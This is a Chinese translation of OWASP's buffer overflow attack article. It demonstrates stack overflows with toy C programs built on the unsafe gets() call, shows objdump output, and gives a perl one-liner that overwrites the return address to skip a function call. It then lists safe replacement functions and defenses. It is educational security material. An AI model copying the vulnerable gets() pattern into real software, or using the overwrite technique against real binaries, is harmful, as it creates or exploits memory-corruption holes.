[TOC]

*最新版本 (mm/dd/yy): 09/3/2014*

翻译自[Buffer overflow attack](https://www.owasp.org/index.php/Buffer_overflow_attack "Buffer overflow attack")

# 漏洞描述
- 缓冲区溢出错误的特点是有意或无意覆写了不应被修改的进程的内存片段。对IP(结构体指针)，BP（栈基指针）和其他寄存器的修改会导致异常、分段错误和其他后果。通常这些错误以意想不到的方式结束应用程序的执行。当我们在char类型的缓冲区上操作时会发生缓冲区溢出错误。
- 缓冲区溢出包括栈溢出和堆溢出。为避免混乱，本文不对这两种溢出方式进行区分。
- 接下来的示例在X86的GNU/Linux环境下由C语言编写

# 风险因素
待定

# 攻击示例
## 示例1
```C
  #include <stdio.h>
  int main(int argc, char **argv)
  {
  char buf[8]; // 长度为8个字节的缓冲区
  gets(buf); // 从stdio读取 (敏感函数!)
  printf("%s\n", buf); // 输出存储在缓冲区的数据
  return 0; // 返回0
  }
```
这是一个非常简单的应用：从标准输入读取字符，然后将其以char的形式复制到缓冲区。缓冲区的长度是8个字节。然后，缓冲区的内容被输出，程序结束
- 程序编译

```shell
rezos@spin ~/inzynieria $ gcc bo-simple.c -o bo-simple
/tmp/ccECXQAX.o: In function `main':
bo-simple.c:(.text+0x17): warning: the `gets' function is dangerous and should not be used.
```
在这个阶段，编译器提示函数gets()不安全。

- 运行示例

```shell
rezos@spin ~/inzynieria $ ./bo-simple // 程序开始
1234 // 我们从键盘上输入"1234"
1234 // 程序输出存储在缓冲区的内容分
rezos@spin ~/inzynieria $ ./bo-simple // 开始
123456789012 // 我们输入 "123456789012"
123456789012 // 缓冲区“buf”的内容？！？！
Segmentation fault // 内存段错误的信息
```
我们幸运地执行了程序的错误操作，引发了它的异常退出

- 问题分析
  这个程序调用了一个函数，对char类型的缓冲区进行操作却没有对溢出缓冲区大小的数值进行检查。结果是，它可能导致有意或无意地存储比缓冲区大小更多的数据，引发一个错误。于是产生了以下问题：这个缓冲区只能存储8个字符，那么为什么`printf()`函数输出了12个字符？答案来自进程内存组织。四个溢出的字符也覆写了一个存储在寄存器的值，该值是函数正确返回所必须的。内存的连续性导致打印出了存储在该处内存的数据

## 示例2
```C
  #include <stdio.h>
  #include <string.h>

  void doit(void)
  {
          char buf[8];

          gets(buf);
          printf("%s\n", buf);
  }

  int main(void)
  {
          printf("So... The End...\n");
          doit();
          printf("or... maybe not?\n");

          return 0;
  }
```
这个例子类似于第一个例子。另外，在`doit（）`函数之前和之后，我们调用了两次`printf（）`函数。

- 编译

```shell
rezos@dojo-labs ~/owasp/buffer_overflow $ gcc example02.c -o example02 -ggdb
/tmp/cccbMjcN.o: In function `doit':
/home/rezos/owasp/buffer_overflow/example02.c:8: warning: the `gets' function is dangerous and should not be used.
```

- 运行示例

```shell
rezos@dojo-labs ~/owasp/buffer_overflow $ ./example02
So... The End...
TEST                   // 输入用户信息
TEST                  // 输出存储的用户信息
or... maybe not?
```

两个`printf()`调用之间的程序显示缓冲区的内容，该缓冲区充满用户输入的数据。

```shell
rezos@dojo-labs ~/owasp/buffer_overflow $ ./example02
So... The End...
TEST123456789
TEST123456789
Segmentation fault
```
- 由于缓冲区的长度确定（char buf[8]）且被长度为13的char类型数组填充，所以该缓冲区溢出了
- 如果我们的二进制程序是ELF格式，那么我们就能使用一个objdump程序来分析并找到引发该缓冲区溢出错误漏洞的必要信息。
- 接下来的是objdump的输出。从输出中我们可以找到`printf()`被调用的地址(0x80483d6 和 0x80483e7)

```shell
rezos@dojo-labs ~/owasp/buffer_overflow $ objdump -d ./example02

080483be <main>:
80483be:       8d 4c 24 04             lea    0x4(%esp),%ecx
80483c2:       83 e4 f0                and    $0xfffffff0,%esp
80483c5:       ff 71 fc                pushl  0xfffffffc(%ecx)
80483c8:       55                      push   %ebp
80483c9:       89 e5                   mov    %esp,%ebp
80483cb:       51                      push   %ecx
80483cc:       83 ec 04                sub    $0x4,%esp
80483cf:       c7 04 24 bc 84 04 08    movl   $0x80484bc,(%esp)
80483d6:       e8 f5 fe ff ff          call   80482d0 <puts@plt>
80483db:       e8 c0 ff ff ff          call   80483a0 <doit>
80483e0:       c7 04 24 cd 84 04 08    movl   $0x80484cd,(%esp)
80483e7:       e8 e4 fe ff ff          call   80482d0 <puts@plt>
80483ec:       b8 00 00 00 00          mov    $0x0,%eax
80483f1:       83 c4 04                add    $0x4,%esp
80483f4:       59                      pop    %ecx
80483f5:       5d                      pop    %ebp
80483f6:       8d 61 fc                lea    0xfffffffc(%ecx),%esp
80483f9:       c3                      ret
80483fa:       90                      nop
80483fb:       90                      nop
```

- 如果第二次调用`printf（）`将通知管理员关于用户注销（例如，关闭会话），那么我们可以尝试省略此步骤并在不调用`printf（）`的情况下完成。

```shell
rezos@dojo-labs ~/owasp/buffer_overflow $ perl -e 'print "A"x12
."\xf9\x83\x04\x08"' | ./example02
So... The End...
AAAAAAAAAAAAu*.
Segmentation fault
```
程序在引发段错误后退出，但第二个`printf（）`调用没有实现
- 一些解释
  `perl -e 'print "A"x12 ."\xf9\x83\x04\x08"`将会输出12个"A"，然后输出四个字符，表示一个我们要执行的指令的地址。为什么是12？

```shell
8 // 缓冲区大小(char buf[8])
+  4 // 四个附加字节用于覆盖堆栈帧指针
----
12
```
- 程序分析
  该问题与示例一类似。没有对复制入缓冲区数据的大小进行控制。在这个示例中我们覆写EIP寄存器的值为地址0x080483f9，这实际上是在程序执行的最后阶段，调用ret。

- 怎样用不同的方式利用缓冲区溢出攻击？
  一般来说，利用这些错误可以用来
  - 应用程序Dos
  - 重新排序函数的执行
  - 代码执行 (注入shellcode)

- 缓冲区溢出错误的成因
  这些类型的错误很容易引发。这些年来该错误是程序员的梦魇。这个问题隐藏在C的本地函数内，不进行缓冲区长度的检查。下面是这些函数和安全的替换项
```C
gets() -> fgets() - 读取字符
strcpy() -> strncpy() - 复制缓冲区内容
strcat() -> strncat() - 缓冲区拼接
sprintf() -> snprintf() - 用不同类型的数据填充缓冲区
(f)scanf() - 从标准输入读取
getwd() - 返回工作目录
realpath() - 返回真实路径
```

- 尽可能使用安全等价的函数，检查缓冲区的长度

```C
gets() -> fgets()
strcpy() -> strncpy()
strcat() -> strncat()
sprintf() -> snprintf()
```

- 那些没有安全等价的函数应被重写以添加检查功能。耗费的时间对未来有益。记住你只需要完成一次。

- 使用编译器，可以识别不安全的函数、逻辑错误和检查内存是否在错误的时间或位置被覆写

# 相关安全活动
- 缓冲区溢出的描述
  参看OWASP关于[缓冲区溢出](https://www.owasp.org/index.php/Buffer_Overflow "缓冲区溢出")的文章.
- 如何避免缓冲区漏洞
  参看[OWASP开发指南](https://www.owasp.org/index.php/Category:OWASP_Guide_Project "OWASP开发指南")关于[避免缓冲区漏洞](https://www.owasp.org/index.php/Buffer_Overflows "避免缓冲区漏洞")的部分
- 如何对缓冲区溢出漏洞进行代码审计
  参看[OWASP代码审计](https://www.owasp.org/index.php/Category:OWASP_Code_Review_Project "OWASP代码审计")指南关于[审计缓冲区覆写和溢出代码](https://www.owasp.org/index.php/Reviewing_Code_for_Buffer_Overruns_and_Overflows "审计缓冲区覆写和溢出代码")的部分

# 相关的威胁代理
待定

# 相关的攻击方式
- [格式化字符串攻击](https://tinytracer.com/archives/%ef%bc%88owasp%e4%b8%aa%e4%ba%ba%e6%b1%89%e5%8c%96%ef%bc%89%e6%94%bb%e5%87%bb%e7%b3%bb%e5%88%97%e5%a4%a7%e5%85%a8%ef%bc%9a%e6%a0%bc%e5%bc%8f%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%94%bb%e5%87%bb/ "格式化字符串攻击")

# 相关漏洞
- [堆溢出](https://www.owasp.org/index.php?title=Heap_overflow&action=edit&redlink=1 "堆溢出")
- [栈溢出](https://www.owasp.org/index.php?title=Stack_overflow&action=edit&redlink=1 "栈溢出")

# 相关防御方式
- [边界检查](https://www.owasp.org/index.php/Bounds_Checking "边界检查")
- [安全的库](https://www.owasp.org/index.php/Safe_Libraries "安全的库")
- [静态代码分析](https://www.owasp.org/index.php/Static_Code_Analysis "静态代码分析")
- [可执行的空间保护](https://www.owasp.org/index.php/Executable_space_protection "可执行的空间保护")
- [地址空间布局随机化 (ASLR)](https://www.owasp.org/index.php?title=Address_space_layout_randomization_(ASLR)&action=edit&redlink=1 "地址空间布局随机化 (ASLR)")
- [堆栈粉碎保护 (SSP)](https://www.owasp.org/index.php/Stack-smashing_Protection_(SSP) "堆栈粉碎保护 (SSP)")

# 参考

- [http://insecure.org/stf/smashstack.html](http://insecure.org/stf/smashstack.html "http://insecure.org/stf/smashstack.html")